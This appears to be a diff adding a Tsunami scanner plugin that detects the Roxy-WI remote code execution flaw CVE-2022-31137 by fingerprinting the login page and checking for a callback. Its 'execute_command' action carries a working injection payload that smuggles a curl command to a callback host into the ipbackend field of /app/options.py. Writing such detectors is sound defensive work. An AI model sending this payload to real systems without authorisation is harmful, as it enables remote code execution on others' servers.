@@ -1,0 +1,87 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Roxywi_CVE_2022_31137"
+  author: 
+    "Robert Dick (robert@doyensec.com) for templated version, "
+    "am0o0 for original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE-2022-31137"
+  }
+  severity: CRITICAL
+  title: "Roxy-wi RCE (CVE-2022-31137)"
+  description: 
+    "Roxy-wi Versions prior to 6.1.1.0 are subject to a remote code execution"
+    " vulnerability."
+  recommendation:
+    "Update Roxy-wi to version 6.1.1.0 or later."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2022-31137"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_roxywi"
+  http_request: {
+    method: GET
+    uri: "/app/login.py"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: '<title>Login page - Roxy-WI</title>' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "execute_command"
+  http_request: {
+    method: POST
+    uri: "/app/options.py"
+    data:
+      "alert_consumer=1&ipbackend=\";curl%20{{ T_CBS_URI }}+#"
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "fingerprint_roxywi",
+    "execute_command",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
